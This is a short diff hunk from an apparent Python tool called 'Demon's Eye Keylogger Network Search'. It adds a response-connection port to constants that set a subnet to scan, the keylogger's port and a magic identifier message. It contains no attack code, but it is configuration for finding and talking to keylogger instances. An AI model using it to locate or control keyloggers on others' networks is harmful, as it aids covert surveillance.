@@ -29,12 +29,14 @@ APPNAME = "Demon's Eye Keylogger Network Search"                    # Just a nam
 VERSION = "1.0"                                                     # Version
 NET_ADDRESS="192.168.10.0/24"                                       # Network adress range to scan (CIDR)
 KEYLOGGER_PORT = 6666                                               # Port of keylogger
+SERVER_PORT = 7777                                                  # Port to receive response connection when search DemonsEye
 PORT_LIST_SCAN = [ KEYLOGGER_PORT ]                                 # List of ports to Scan. For testing multiple ports
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='      # Message to indentify to keylogger
 BUFFER_SIZE = 4096                                                  # Buffer size
 DEFAULT_TIMEOUT = 2                                                 # Default Timeout (seconds)
 ENCODING = 'utf-8'                                                  # Encodinf for message sended
 VERBOSE_LEVELS = [ "none", "error", "insane debug" ]                # Verbose levels
+
 
 ########################################################
 # VARIABLES
